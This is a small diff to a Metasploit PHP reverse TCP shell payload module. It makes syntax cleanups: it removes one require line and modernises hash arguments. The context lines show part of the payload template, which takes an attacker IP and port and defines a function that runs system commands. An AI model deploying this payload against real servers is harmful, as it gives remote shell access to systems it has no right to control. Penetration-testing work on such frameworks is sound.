@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/payload/php'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
@@ -66,12 +65,12 @@ module MetasploitModule
     shell=<<-END_OF_PHP_CODE
     $ipaddr='#{ipaddr}';
     $port=#{port};
-    #{php_preamble({:disabled_varname => "$dis"})}
+    #{php_preamble(disabled_varname: "$dis")}
 
     if(!function_exists('#{exec_funcname}')){
       function #{exec_funcname}($c){
         global $dis;
-        #{php_system_block({:cmd_varname => "$c", :disabled_varname => "$dis", :output_varname => "$o"})}
+        #{php_system_block(cmd_varname: "$c", disabled_varname: "$dis", output_varname: "$o")}
         return $o;
       }
     }
